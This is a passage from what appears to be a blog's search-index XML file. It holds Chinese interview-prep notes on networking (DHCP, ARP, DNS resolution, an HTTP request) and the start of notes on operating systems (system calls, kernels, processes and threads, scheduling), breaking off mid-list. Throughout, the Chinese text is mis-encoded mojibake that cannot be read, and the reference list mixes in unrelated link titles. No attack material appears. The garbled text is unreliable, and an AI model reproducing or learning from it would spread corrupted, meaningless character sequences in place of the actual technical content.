è¯¥æŠ¥æ–‡æ®µåˆ™è¢«æ”¾å…¥åœ¨ä¸€ä¸ªå…·æœ‰å¹¿æ’­ IP ç›®çš„åœ°å€(255.255.255.255) å’Œæº IP åœ°å€ï¼ˆ0.0.0.0ï¼‰çš„ IP æ•°æ®æŠ¥ä¸­ã€‚ è¯¥æ•°æ®æŠ¥åˆ™è¢«æ”¾ç½®åœ¨ MAC å¸§ä¸­ï¼Œè¯¥å¸§å…·æœ‰ç›®çš„åœ°å€ FF:FF:FF:FF:FF:FFï¼Œå°†å¹¿æ’­åˆ°ä¸äº¤æ¢æœºè¿æ¥çš„æ‰€æœ‰è®¾å¤‡ã€‚ è¿æ¥åœ¨äº¤æ¢æœºçš„ DHCP æœåŠ¡å™¨æ”¶åˆ°å¹¿æ’­å¸§ä¹‹åï¼Œä¸æ–­åœ°å‘ä¸Šåˆ†è§£å¾—åˆ° IP æ•°æ®æŠ¥ã€UDP æŠ¥æ–‡æ®µã€DHCP è¯·æ±‚æŠ¥æ–‡ï¼Œä¹‹åç”Ÿæˆ DHCP ACK æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡åŒ…å«ä»¥ä¸‹ä¿¡æ¯ï¼šIP åœ°å€ã€DNS æœåŠ¡å™¨çš„ IP åœ°å€ã€é»˜è®¤ç½‘å…³è·¯ç”±å™¨çš„ IP åœ°å€å’Œå­ç½‘æ©ç ã€‚è¯¥æŠ¥æ–‡è¢«æ”¾å…¥ UDP æŠ¥æ–‡æ®µä¸­ï¼ŒUDP æŠ¥æ–‡æ®µæœ‰è¢«æ”¾å…¥ IP æ•°æ®æŠ¥ä¸­ï¼Œæœ€åæ”¾å…¥ MAC å¸§ä¸­ã€‚ è¯¥å¸§çš„ç›®çš„åœ°å€æ˜¯è¯·æ±‚ä¸»æœºçš„ MAC åœ°å€ï¼Œå› ä¸ºäº¤æ¢æœºå…·æœ‰è‡ªå­¦ä¹ èƒ½åŠ›ï¼Œä¹‹å‰ä¸»æœºå‘é€äº†å¹¿æ’­å¸§ä¹‹åå°±è®°å½•äº† MAC åœ°å€åˆ°å…¶è½¬å‘æ¥å£çš„äº¤æ¢è¡¨é¡¹ï¼Œå› æ­¤ç°åœ¨äº¤æ¢æœºå°±å¯ä»¥ç›´æ¥çŸ¥é“åº”è¯¥å‘å“ªä¸ªæ¥å£å‘é€è¯¥å¸§ã€‚ ä¸»æœºæ”¶åˆ°è¯¥å¸§åï¼Œä¸æ–­åˆ†è§£å¾—åˆ° DHCP æŠ¥æ–‡ã€‚ä¹‹åå°±é…ç½®å®ƒçš„ IP åœ°å€ã€å­ç½‘æ©ç å’Œ DNS æœåŠ¡å™¨çš„ IP åœ°å€ï¼Œå¹¶åœ¨å…¶ IP è½¬å‘è¡¨ä¸­å®‰è£…é»˜è®¤ç½‘å…³ã€‚ 2. ARP è§£æ MAC åœ°å€ ä¸»æœºé€šè¿‡æµè§ˆå™¨ç”Ÿæˆä¸€ä¸ª TCP å¥—æ¥å­—ï¼Œå¥—æ¥å­—å‘ HTTP æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚ã€‚ä¸ºäº†ç”Ÿæˆè¯¥å¥—æ¥å­—ï¼Œä¸»æœºéœ€è¦çŸ¥é“ç½‘ç«™çš„åŸŸåå¯¹åº”çš„ IP åœ°å€ã€‚ ä¸»æœºç”Ÿæˆä¸€ä¸ª DNS æŸ¥è¯¢æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡å…·æœ‰ 53 å·ç«¯å£ï¼Œå› ä¸º DNS æœåŠ¡å™¨çš„ç«¯å£å·æ˜¯ 53ã€‚ è¯¥ DNS æŸ¥è¯¢æŠ¥æ–‡è¢«æ”¾å…¥ç›®çš„åœ°å€ä¸º DNS æœåŠ¡å™¨ IP åœ°å€çš„ IP æ•°æ®æŠ¥ä¸­ã€‚ è¯¥ IP æ•°æ®æŠ¥è¢«æ”¾å…¥ä¸€ä¸ªä»¥å¤ªç½‘å¸§ä¸­ï¼Œè¯¥å¸§å°†å‘é€åˆ°ç½‘å…³è·¯ç”±å™¨ã€‚ DHCP è¿‡ç¨‹åªçŸ¥é“ç½‘å…³è·¯ç”±å™¨çš„ IP åœ°å€ï¼Œä¸ºäº†è·å–ç½‘å…³è·¯ç”±å™¨çš„ MAC åœ°å€ï¼Œéœ€è¦ä½¿ç”¨ ARP åè®®ã€‚ ä¸»æœºç”Ÿæˆä¸€ä¸ªåŒ…å«ç›®çš„åœ°å€ä¸ºç½‘å…³è·¯ç”±å™¨ IP åœ°å€çš„ ARP æŸ¥è¯¢æŠ¥æ–‡ï¼Œå°†è¯¥ ARP æŸ¥è¯¢æŠ¥æ–‡æ”¾å…¥ä¸€ä¸ªå…·æœ‰å¹¿æ’­ç›®çš„åœ°å€ï¼ˆFF:FF:FF:FF:FF:FFï¼‰çš„ä»¥å¤ªç½‘å¸§ä¸­ï¼Œå¹¶å‘äº¤æ¢æœºå‘é€è¯¥ä»¥å¤ªç½‘å¸§ï¼Œäº¤æ¢æœºå°†è¯¥å¸§è½¬å‘ç»™æ‰€æœ‰çš„è¿æ¥è®¾å¤‡ï¼ŒåŒ…æ‹¬ç½‘å…³è·¯ç”±å™¨ã€‚ ç½‘å…³è·¯ç”±å™¨æ¥æ”¶åˆ°è¯¥å¸§åï¼Œä¸æ–­å‘ä¸Šåˆ†è§£å¾—åˆ° ARP æŠ¥æ–‡ï¼Œå‘ç°å…¶ä¸­çš„ IP åœ°å€ä¸å…¶æ¥å£çš„ IP åœ°å€åŒ¹é…ï¼Œå› æ­¤å°±å‘é€ä¸€ä¸ª ARP å›ç­”æŠ¥æ–‡ï¼ŒåŒ…å«äº†å®ƒçš„ MAC åœ°å€ï¼Œå‘å›ç»™ä¸»æœºã€‚ 3. DNS è§£æåŸŸå çŸ¥é“äº†ç½‘å…³è·¯ç”±å™¨çš„ MAC åœ°å€ä¹‹åï¼Œå°±å¯ä»¥ç»§ç»­ DNS çš„è§£æè¿‡ç¨‹äº†ã€‚ ç½‘å…³è·¯ç”±å™¨æ¥æ”¶åˆ°åŒ…å« DNS æŸ¥è¯¢æŠ¥æ–‡çš„ä»¥å¤ªç½‘å¸§åï¼ŒæŠ½å–å‡º IP æ•°æ®æŠ¥ï¼Œå¹¶æ ¹æ®è½¬å‘è¡¨å†³å®šè¯¥ IP æ•°æ®æŠ¥åº”è¯¥è½¬å‘çš„è·¯ç”±å™¨ã€‚ å› ä¸ºè·¯ç”±å™¨å…·æœ‰å†…éƒ¨ç½‘å…³åè®®ï¼ˆRIPã€OSPFï¼‰å’Œå¤–éƒ¨ç½‘å…³åè®®ï¼ˆBGPï¼‰è¿™ä¸¤ç§è·¯ç”±é€‰æ‹©åè®®ï¼Œå› æ­¤è·¯ç”±è¡¨ä¸­å·²ç»é…ç½®äº†ç½‘å…³è·¯ç”±å™¨åˆ°è¾¾ DNS æœåŠ¡å™¨çš„è·¯ç”±è¡¨é¡¹ã€‚ åˆ°è¾¾ DNS æœåŠ¡å™¨ä¹‹åï¼ŒDNS æœåŠ¡å™¨æŠ½å–å‡º DNS æŸ¥è¯¢æŠ¥æ–‡ï¼Œå¹¶åœ¨ DNS æ•°æ®åº“ä¸­æŸ¥æ‰¾å¾…è§£æçš„åŸŸåã€‚ æ‰¾åˆ° DNS è®°å½•ä¹‹åï¼Œå‘é€ DNS å›ç­”æŠ¥æ–‡ï¼Œå°†è¯¥å›ç­”æŠ¥æ–‡æ”¾å…¥ UDP æŠ¥æ–‡æ®µä¸­ï¼Œç„¶åæ”¾å…¥ IP æ•°æ®æŠ¥ä¸­ï¼Œé€šè¿‡è·¯ç”±å™¨åå‘è½¬å‘å›ç½‘å…³è·¯ç”±å™¨ï¼Œå¹¶ç»è¿‡ä»¥å¤ªç½‘äº¤æ¢æœºåˆ°è¾¾ä¸»æœºã€‚ 4. HTTP è¯·æ±‚é¡µé¢ æœ‰äº† HTTP æœåŠ¡å™¨çš„ IP åœ°å€ä¹‹åï¼Œä¸»æœºå°±èƒ½å¤Ÿç”Ÿæˆ TCP å¥—æ¥å­—ï¼Œè¯¥å¥—æ¥å­—å°†ç”¨äºå‘ Web æœåŠ¡å™¨å‘é€ HTTP GET æŠ¥æ–‡ã€‚ åœ¨ç”Ÿæˆ TCP å¥—æ¥å­—ä¹‹å‰ï¼Œå¿…é¡»å…ˆä¸ HTTP æœåŠ¡å™¨è¿›è¡Œä¸‰æ¬¡æ¡æ‰‹æ¥å»ºç«‹è¿æ¥ã€‚ç”Ÿæˆä¸€ä¸ªå…·æœ‰ç›®çš„ç«¯å£ 80 çš„ TCP SYN æŠ¥æ–‡æ®µï¼Œå¹¶å‘ HTTP æœåŠ¡å™¨å‘é€è¯¥æŠ¥æ–‡æ®µã€‚ HTTP æœåŠ¡å™¨æ”¶åˆ°è¯¥æŠ¥æ–‡æ®µä¹‹åï¼Œç”Ÿæˆ TCP SYN ACK æŠ¥æ–‡æ®µï¼Œå‘å›ç»™ä¸»æœºã€‚ è¿æ¥å»ºç«‹ä¹‹åï¼Œæµè§ˆå™¨ç”Ÿæˆ HTTP GET æŠ¥æ–‡ï¼Œå¹¶äº¤ä»˜ç»™ HTTP æœåŠ¡å™¨ã€‚ HTTP æœåŠ¡å™¨ä» TCP å¥—æ¥å­—è¯»å– HTTP GET æŠ¥æ–‡ï¼Œç”Ÿæˆä¸€ä¸ª HTTP å“åº”æŠ¥æ–‡ï¼Œå°† Web é¡µé¢å†…å®¹æ”¾å…¥æŠ¥æ–‡ä¸»ä½“ä¸­ï¼Œå‘å›ç»™ä¸»æœºã€‚ æµè§ˆå™¨æ”¶åˆ° HTTP å“åº”æŠ¥æ–‡åï¼ŒæŠ½å–å‡º Web é¡µé¢å†…å®¹ï¼Œä¹‹åè¿›è¡Œæ¸²æŸ“ï¼Œæ˜¾ç¤º Web é¡µé¢ã€‚ å‚è€ƒèµ„æ–™ è®¡ç®—æœºç½‘ç»œ, è°¢å¸Œä» JamesF.Kurose, KeithW.Ross, åº“ç½—æ–¯, ç­‰. è®¡ç®—æœºç½‘ç»œ: è‡ªé¡¶å‘ä¸‹æ–¹æ³• [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2014. W.RichardStevens. TCP/IP è¯¦è§£. å· 1, åè®® [M]. æœºæ¢°å·¥ä¸šå‡ºç‰ˆç¤¾, 2006. Active vs Passive FTP Mode: Which One is More Secure? Active and Passive FTP Transfers Defined - KB Article #1138 How DHCP works and DHCP Interview Questions and Answers What is process of DORA in DHCP? What is DHCP Server ? Tackling emissions targets in Tokyo What does my ISP know when I use Tor? Technology-Computer Networking[1]-Computer Networks and the Internet P2P ç½‘ç»œæ¦‚è¿°. Circuit Switching (a) Circuit switching. (b) Packet switching.]]></content>
      <categories>
        <category>Github</category>
        <category>Interview-Notebook</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[è®¡ç®—æœºæ“ä½œç³»ç»Ÿ]]></title>
    <url>%2F2018%2F07%2F04%2FJava%2FInterview%2FInterview-Notebook%2F%E8%AE%A1%E7%AE%97%E6%9C%BA%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%2F</url>
    <content type="text"><![CDATA[ä¸€ã€æ¦‚è¿° æ“ä½œç³»ç»ŸåŸºæœ¬ç‰¹å¾ æ“ä½œç³»ç»ŸåŸºæœ¬åŠŸèƒ½ ç³»ç»Ÿè°ƒç”¨ å¤§å†…æ ¸å’Œå¾®å†…æ ¸ ä¸­æ–­åˆ†ç±» äºŒã€è¿›ç¨‹ç®¡ç† è¿›ç¨‹ä¸çº¿ç¨‹ è¿›ç¨‹çŠ¶æ€çš„åˆ‡æ¢ è¿›ç¨‹è°ƒåº¦ç®—æ³• è¿›ç¨‹åŒæ­¥ ç»å…¸åŒæ­¥é—®é¢˜ è¿›ç¨‹é€šä¿¡ ä¸‰ã€æ­»é” æ­»é”çš„å¿…è¦æ¡ä»¶ æ­»é”çš„å¤„ç†æ–¹æ³• å››ã€å†…å­˜ç®¡ç† è™šæ‹Ÿå†…å­˜ åˆ†é¡µç³»ç»Ÿåœ°å€æ˜ å°„ é¡µé¢ç½®æ¢ç®—æ³• åˆ†æ®µ æ®µé¡µå¼ åˆ†é¡µä¸åˆ†æ®µçš„æ¯”è¾ƒ äº”ã€è®¾å¤‡ç®¡ç† ç£ç›˜è°ƒåº¦ç®—æ³• å…­ã€é“¾æ¥ ç¼–è¯‘ç³»ç»Ÿ é™æ€é“¾æ¥ ç›®æ ‡æ–‡ä»¶ åŠ¨æ€é“¾æ¥ å‚è€ƒèµ„æ–™ ä¸€ã€æ¦‚è¿°æ“ä½œç³»ç»ŸåŸºæœ¬ç‰¹å¾1. å¹¶å‘å¹¶å‘æ˜¯æŒ‡å®è§‚ä¸Šåœ¨ä¸€æ®µæ—¶é—´å†…èƒ½åŒæ—¶è¿è¡Œå¤šä¸ªç¨‹åºï¼Œè€Œå¹¶è¡Œåˆ™æŒ‡åŒä¸€æ—¶åˆ»èƒ½è¿è¡Œå¤šä¸ªæŒ‡ä»¤ã€‚ å¹¶è¡Œéœ€è¦ç¡¬ä»¶æ”¯æŒï¼Œå¦‚å¤šæµæ°´çº¿æˆ–è€…å¤šå¤„ç†å™¨ã€‚ æ“ä½œç³»ç»Ÿé€šè¿‡å¼•å…¥è¿›ç¨‹å’Œçº¿ç¨‹ï¼Œä½¿å¾—ç¨‹åºèƒ½å¤Ÿå¹¶å‘è¿è¡Œã€‚ 2. å…±äº«å…±äº«æ˜¯æŒ‡ç³»ç»Ÿä¸­çš„èµ„æºå¯ä»¥è¢«å¤šä¸ªå¹¶å‘è¿›ç¨‹å…±åŒä½¿ç”¨ã€‚ æœ‰ä¸¤ç§å…±äº«æ–¹å¼ï¼šäº’æ–¥å…±äº«å’ŒåŒæ—¶å…±äº«ã€‚ äº’æ–¥å…±äº«çš„èµ„æºç§°ä¸ºä¸´ç•Œèµ„æºï¼Œä¾‹å¦‚æ‰“å°æœºç­‰ï¼Œåœ¨åŒä¸€æ—¶é—´åªå…è®¸ä¸€ä¸ªè¿›ç¨‹è®¿é—®ï¼Œéœ€è¦ç”¨åŒæ­¥æœºåˆ¶æ¥å®ç°å¯¹ä¸´ç•Œèµ„æºçš„è®¿é—®ã€‚ 3. è™šæ‹Ÿè™šæ‹ŸæŠ€æœ¯æŠŠä¸€ä¸ªç‰©ç†å®ä½“è½¬æ¢ä¸ºå¤šä¸ªé€»è¾‘å®ä½“ã€‚ ä¸»è¦æœ‰ä¸¤ç§è™šæ‹ŸæŠ€æœ¯ï¼šæ—¶åˆ†å¤ç”¨æŠ€æœ¯å’Œç©ºåˆ†å¤ç”¨æŠ€æœ¯ã€‚ä¾‹å¦‚å¤šä¸ªè¿›ç¨‹èƒ½åœ¨åŒä¸€ä¸ªå¤„ç†å™¨ä¸Šå¹¶å‘æ‰§è¡Œä½¿ç”¨äº†æ—¶åˆ†å¤ç”¨æŠ€æœ¯ï¼Œè®©æ¯ä¸ªè¿›ç¨‹è½®æµå æœ‰å¤„ç†å™¨ï¼Œæ¯æ¬¡åªæ‰§è¡Œä¸€å°ä¸ªæ—¶é—´ç‰‡å¹¶å¿«é€Ÿåˆ‡æ¢ã€‚ 4. å¼‚æ­¥å¼‚æ­¥æŒ‡è¿›ç¨‹ä¸æ˜¯ä¸€æ¬¡æ€§æ‰§è¡Œå®Œæ¯•ï¼Œè€Œæ˜¯èµ°èµ°åœåœï¼Œä»¥ä¸å¯çŸ¥çš„é€Ÿåº¦å‘å‰æ¨è¿›ã€‚ æ“ä½œç³»ç»ŸåŸºæœ¬åŠŸèƒ½1. è¿›ç¨‹ç®¡ç†è¿›ç¨‹æ§åˆ¶ã€è¿›ç¨‹åŒæ­¥ã€è¿›ç¨‹é€šä¿¡ã€æ­»é”å¤„ç†ã€å¤„ç†æœºè°ƒåº¦ç­‰ã€‚ 2. å†…å­˜ç®¡ç†å†…å­˜åˆ†é…ã€åœ°å€æ˜ å°„ã€å†…å­˜ä¿æŠ¤ä¸å…±äº«ã€è™šæ‹Ÿå†…å­˜ç­‰ã€‚ 3. æ–‡ä»¶ç®¡ç†æ–‡ä»¶å­˜å‚¨ç©ºé—´çš„ç®¡ç†ã€ç›®å½•ç®¡ç†ã€æ–‡ä»¶è¯»å†™ç®¡ç†å’Œä¿æŠ¤ç­‰ã€‚ 4. è®¾å¤‡ç®¡ç†å®Œæˆç”¨æˆ·çš„ I/O è¯·æ±‚ï¼Œæ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨å„ç§è®¾å¤‡ï¼Œå¹¶æé«˜è®¾å¤‡çš„åˆ©ç”¨ç‡ã€‚ ä¸»è¦åŒ…æ‹¬ç¼“å†²ç®¡ç†ã€è®¾å¤‡åˆ†é…ã€è®¾å¤‡å¤„ç†ã€è™›æ‹Ÿè®¾å¤‡ç­‰ã€‚ ç³»ç»Ÿè°ƒç”¨å¦‚æœä¸€ä¸ªè¿›ç¨‹åœ¨ç”¨æˆ·æ€éœ€è¦ä½¿ç”¨å†…æ ¸æ€çš„åŠŸèƒ½ï¼Œå°±è¿›è¡Œç³»ç»Ÿè°ƒç”¨ä»è€Œé™·å…¥å†…æ ¸ï¼Œç”±æ“ä½œç³»ç»Ÿä»£ä¸ºå®Œæˆã€‚ Linux çš„ç³»ç»Ÿè°ƒç”¨ä¸»è¦æœ‰ä»¥ä¸‹è¿™äº›ï¼š Task Commands è¿›ç¨‹æ§åˆ¶ fork(); exit(); wait(); è¿›ç¨‹é€šä¿¡ pipe(); shmget(); mmap(); æ–‡ä»¶æ“ä½œ open(); read(); write(); è®¾å¤‡æ“ä½œ ioctl(); read(); write(); ä¿¡æ¯ç»´æŠ¤ getpid(); alarm(); sleep(); å®‰å…¨ chmod(); umask(); chown(); å¤§å†…æ ¸å’Œå¾®å†…æ ¸1. å¤§å†…æ ¸å¤§å†…æ ¸æ˜¯å°†æ“ä½œç³»ç»ŸåŠŸèƒ½ä½œä¸ºä¸€ä¸ªç´§å¯†ç»“åˆçš„æ•´ä½“æ”¾åˆ°å†…æ ¸ã€‚ ç”±äºå„æ¨¡å—å…±äº«ä¿¡æ¯ï¼Œå› æ­¤æœ‰å¾ˆé«˜çš„æ€§èƒ½ã€‚ 2. å¾®å†…æ ¸ç”±äºæ“ä½œç³»ç»Ÿä¸æ–­å¤æ‚ï¼Œå› æ­¤å°†ä¸€éƒ¨åˆ†æ“ä½œç³»ç»ŸåŠŸèƒ½ç§»å‡ºå†…æ ¸ï¼Œä»è€Œé™ä½å†…æ ¸çš„å¤æ‚æ€§ã€‚ç§»å‡ºçš„éƒ¨åˆ†æ ¹æ®åˆ†å±‚çš„åŸåˆ™åˆ’åˆ†æˆè‹¥å¹²æœåŠ¡ï¼Œç›¸äº’ç‹¬ç«‹ã€‚ åœ¨å¾®å†…æ ¸ç»“æ„ä¸‹ï¼Œæ“ä½œç³»ç»Ÿè¢«åˆ’åˆ†æˆå°çš„ã€å®šä¹‰è‰¯å¥½çš„æ¨¡å—ï¼Œåªæœ‰å¾®å†…æ ¸è¿™ä¸€ä¸ªæ¨¡å—è¿è¡Œåœ¨å†…æ ¸æ€ï¼Œå…¶ä½™æ¨¡å—è¿è¡Œåœ¨ç”¨æˆ·æ€ã€‚ å› ä¸ºéœ€è¦é¢‘ç¹åœ°åœ¨ç”¨æˆ·æ€å’Œæ ¸å¿ƒæ€ä¹‹é—´è¿›è¡Œåˆ‡æ¢ï¼Œæ‰€ä»¥ä¼šæœ‰ä¸€å®šçš„æ€§èƒ½æŸå¤±ã€‚ ä¸­æ–­åˆ†ç±»1. å¤–ä¸­æ–­ç”± CPU æ‰§è¡ŒæŒ‡ä»¤ä»¥å¤–çš„äº‹ä»¶å¼•èµ·ï¼Œå¦‚ I/O å®Œæˆä¸­æ–­ï¼Œè¡¨ç¤ºè®¾å¤‡è¾“å…¥/è¾“å‡ºå¤„ç†å·²ç»å®Œæˆï¼Œå¤„ç†å™¨èƒ½å¤Ÿå‘é€ä¸‹ä¸€ä¸ªè¾“å…¥/è¾“å‡ºè¯·æ±‚ã€‚æ­¤å¤–è¿˜æœ‰æ—¶é’Ÿä¸­æ–­ã€æ§åˆ¶å°ä¸­æ–­ç­‰ã€‚ 2. å¼‚å¸¸ç”± CPU æ‰§è¡ŒæŒ‡ä»¤çš„å†…éƒ¨äº‹ä»¶å¼•èµ·ï¼Œå¦‚éæ³•æ“ä½œç ã€åœ°å€è¶Šç•Œã€ç®—æœ¯æº¢å‡ºç­‰ã€‚ 3. é™·å…¥åœ¨ç”¨æˆ·ç¨‹åºä¸­ä½¿ç”¨ç³»ç»Ÿè°ƒç”¨ã€‚ äºŒã€è¿›ç¨‹ç®¡ç†è¿›ç¨‹ä¸çº¿ç¨‹1. è¿›ç¨‹è¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ã€‚ è¿›ç¨‹æ§åˆ¶å— (Process Control Block, PCB) æè¿°è¿›ç¨‹çš„åŸºæœ¬ä¿¡æ¯å’Œè¿è¡ŒçŠ¶æ€ï¼Œæ‰€è°“çš„åˆ›å»ºè¿›ç¨‹å’Œæ’¤é”€è¿›ç¨‹ï¼Œéƒ½æ˜¯æŒ‡å¯¹ PCB çš„æ“ä½œã€‚ ä¸‹å›¾æ˜¾ç¤ºäº† 4 ä¸ªç¨‹åºåˆ›å»ºäº† 4 ä¸ªè¿›ç¨‹ï¼Œè¿™ 4 ä¸ªè¿›ç¨‹å¯ä»¥å¹¶å‘åœ°æ‰§è¡Œã€‚ 2. çº¿ç¨‹çº¿ç¨‹æ˜¯ç‹¬ç«‹è°ƒåº¦çš„åŸºæœ¬å•ä½ã€‚ ä¸€ä¸ªè¿›ç¨‹ä¸­å¯ä»¥æœ‰å¤šä¸ªçº¿ç¨‹ï¼Œå®ƒä»¬å…±äº«è¿›ç¨‹èµ„æºã€‚ 3. åŒºåˆ« æ‹¥æœ‰èµ„æºï¼šè¿›ç¨‹æ˜¯èµ„æºåˆ†é…çš„åŸºæœ¬å•ä½ï¼Œä½†æ˜¯çº¿ç¨‹ä¸æ‹¥æœ‰èµ„æºï¼Œçº¿ç¨‹å¯ä»¥è®¿é—®éš¶å±è¿›ç¨‹çš„èµ„æºã€‚ è°ƒåº¦ï¼šçº¿ç¨‹æ˜¯ç‹¬ç«‹è°ƒåº¦çš„åŸºæœ¬å•ä½ï¼Œåœ¨åŒä¸€è¿›ç¨‹ä¸­ï¼Œçº¿ç¨‹çš„åˆ‡æ¢ä¸ä¼šå¼•èµ·è¿›ç¨‹åˆ‡æ¢ï¼Œä»ä¸€ä¸ªè¿›ç¨‹å†…çš„çº¿ç¨‹åˆ‡æ¢åˆ°å¦ä¸€ä¸ªè¿›ç¨‹ä¸­çš„çº¿ç¨‹æ—¶ï¼Œä¼šå¼•èµ·è¿›ç¨‹åˆ‡æ¢ã€‚ ç³»ç»Ÿå¼€é”€ï¼šç”±äºåˆ›å»ºæˆ–æ’¤é”€è¿›ç¨‹æ—¶ï¼Œç³»ç»Ÿéƒ½è¦ä¸ºä¹‹åˆ†é…æˆ–å›æ”¶èµ„æºï¼Œå¦‚å†…å­˜ç©ºé—´ã€I/O è®¾å¤‡ç­‰ï¼Œæ‰€ä»˜å‡ºçš„å¼€é”€è¿œå¤§äºåˆ›å»ºæˆ–æ’¤é”€çº¿ç¨‹æ—¶çš„å¼€é”€ã€‚ç±»ä¼¼åœ°ï¼Œåœ¨è¿›è¡Œè¿›ç¨‹åˆ‡æ¢æ—¶ï¼Œæ¶‰åŠå½“å‰æ‰§è¡Œè¿›ç¨‹ CPU ç¯å¢ƒçš„ä¿å­˜åŠæ–°è°ƒåº¦è¿›ç¨‹ CPU ç¯å¢ƒçš„è®¾ç½®ï¼Œè€Œçº¿ç¨‹åˆ‡æ¢æ—¶åªéœ€ä¿å­˜å’Œè®¾ç½®å°‘é‡å¯„å­˜å™¨å†…å®¹ï¼Œå¼€é”€å¾ˆå°ã€‚ é€šä¿¡æ–¹é¢ï¼šè¿›ç¨‹é—´é€šä¿¡ (IPC) éœ€è¦è¿›ç¨‹åŒæ­¥å’Œäº’æ–¥æ‰‹æ®µçš„è¾…åŠ©ï¼Œä»¥ä¿è¯æ•°æ®çš„ä¸€è‡´æ€§ã€‚è€Œçº¿ç¨‹é—´å¯ä»¥é€šè¿‡ç›´æ¥è¯»/å†™åŒä¸€è¿›ç¨‹ä¸­çš„æ•°æ®æ®µï¼ˆå¦‚å…¨å±€å˜é‡ï¼‰æ¥è¿›è¡Œé€šä¿¡ã€‚ ä¸¾ä¾‹ï¼šQQ å’Œæµè§ˆå™¨æ˜¯ä¸¤ä¸ªè¿›ç¨‹ï¼Œæµè§ˆå™¨è¿›ç¨‹é‡Œé¢æœ‰å¾ˆå¤šçº¿ç¨‹ï¼Œä¾‹å¦‚ HTTP è¯·æ±‚çº¿ç¨‹ã€äº‹ä»¶å“åº”çº¿ç¨‹ã€æ¸²æŸ“çº¿ç¨‹ç­‰ç­‰ï¼Œçº¿ç¨‹çš„å¹¶å‘æ‰§è¡Œä½¿å¾—åœ¨æµè§ˆå™¨ä¸­ç‚¹å‡»ä¸€ä¸ªæ–°é“¾æ¥ä»è€Œå‘èµ· HTTP è¯·æ±‚æ—¶ï¼Œæµè§ˆå™¨è¿˜å¯ä»¥å“åº”ç”¨æˆ·çš„å…¶å®ƒäº‹ä»¶ã€‚ è¿›ç¨‹çŠ¶æ€çš„åˆ‡æ¢ å°±ç»ªçŠ¶æ€ï¼ˆreadyï¼‰ï¼šç­‰å¾…è¢«è°ƒåº¦ è¿è¡ŒçŠ¶æ€ï¼ˆrunningï¼‰ é˜»å¡çŠ¶æ€ï¼ˆwaitingï¼‰ï¼šç­‰å¾…èµ„æº åº”è¯¥æ³¨æ„ä»¥ä¸‹å†…å®¹ï¼š åªæœ‰å°±ç»ªæ€å’Œè¿è¡Œæ€å¯ä»¥ç›¸äº’è½¬æ¢ï¼Œå…¶å®ƒçš„éƒ½æ˜¯å•å‘è½¬æ¢ã€‚å°±ç»ªçŠ¶æ€çš„è¿›ç¨‹é€šè¿‡è°ƒåº¦ç®—æ³•ä»è€Œè·å¾— CPU æ—¶é—´ï¼Œè½¬ä¸ºè¿è¡ŒçŠ¶æ€ï¼›è€Œè¿è¡ŒçŠ¶æ€çš„è¿›ç¨‹ï¼Œåœ¨åˆ†é…ç»™å®ƒçš„ CPU æ—¶é—´ç‰‡ç”¨å®Œä¹‹åå°±ä¼šè½¬ä¸ºå°±ç»ªçŠ¶æ€ï¼Œç­‰å¾…ä¸‹ä¸€æ¬¡è°ƒåº¦ã€‚ é˜»å¡çŠ¶æ€æ˜¯ç¼ºå°‘éœ€è¦çš„èµ„æºä»è€Œç”±è¿è¡ŒçŠ¶æ€è½¬æ¢è€Œæ¥ï¼Œä½†æ˜¯è¯¥èµ„æºä¸åŒ…æ‹¬ CPU æ—¶é—´ï¼Œç¼ºå°‘ CPU æ—¶é—´ä¼šä»è¿è¡Œæ€è½¬æ¢ä¸ºå°±ç»ªæ€ã€‚ è¿›ç¨‹è°ƒåº¦ç®—æ³•ä¸åŒç¯å¢ƒçš„è°ƒåº¦ç®—æ³•ç›®æ ‡ä¸åŒï¼Œå› æ­¤éœ€è¦é’ˆå¯¹ä¸åŒç¯å¢ƒæ¥è®¨è®ºè°ƒåº¦ç®—æ³•ã€‚ 1. æ‰¹å¤„ç†ç³»ç»Ÿæ‰¹å¤„ç†ç³»ç»Ÿæ²¡æœ‰å¤ªå¤šçš„ç”¨æˆ·æ“ä½œï¼Œåœ¨è¯¥ç³»ç»Ÿä¸­ï¼Œè°ƒåº¦ç®—æ³•ç›®æ ‡æ˜¯ä¿è¯ååé‡å’Œå‘¨è½¬æ—¶é—´ï¼ˆä»æäº¤åˆ°ç»ˆæ­¢çš„æ—¶é—´ï¼‰ã€‚ 1.1 å…ˆæ¥å…ˆæœåŠ¡ first-come first-serverdï¼ˆFCFSï¼‰ æŒ‰ç…§è¯·æ±‚çš„é¡ºåºè¿›è¡Œè°ƒåº¦ã€‚ æœ‰åˆ©äºé•¿ä½œä¸šï¼Œä½†ä¸åˆ©äºçŸ­ä½œä¸šï¼Œå› ä¸ºçŸ­ä½œä¸šå¿…é¡»ä¸€ç›´ç­‰å¾…å‰é¢çš„é•¿ä½œä¸šæ‰§è¡Œå®Œæ¯•æ‰èƒ½æ‰§è¡Œï¼Œè€Œé•¿ä½œä¸šåˆéœ€è¦æ‰§è¡Œå¾ˆé•¿æ—¶é—´ï¼Œé€ æˆäº†çŸ­ä½œä¸šç­‰å¾…æ—¶é—´è¿‡é•¿ã€‚ 1.2 çŸ­ä½œä¸šä¼˜å…ˆ shortest job firstï¼ˆSJFï¼‰ æŒ‰ä¼°è®¡è¿è¡Œæ—¶é—´æœ€çŸ­çš„é¡ºåºè¿›è¡Œè°ƒåº¦ã€‚ é•¿ä½œä¸šæœ‰å¯èƒ½ä¼šé¥¿æ­»ï¼Œå¤„äºä¸€ç›´ç­‰å¾…çŸ­ä½œä¸šæ‰§è¡Œå®Œæ¯•çš„çŠ¶æ€ã€‚å› ä¸ºå¦‚æœä¸€ç›´æœ‰çŸ­ä½œä¸šåˆ°æ¥ï¼Œé‚£ä¹ˆé•¿ä½œä¸šæ°¸è¿œå¾—ä¸åˆ°è°ƒåº¦ã€‚ 1.3 æœ€çŸ­å‰©ä½™æ—¶é—´ä¼˜å…ˆ shortest remaining time nextï¼ˆSRTNï¼‰ 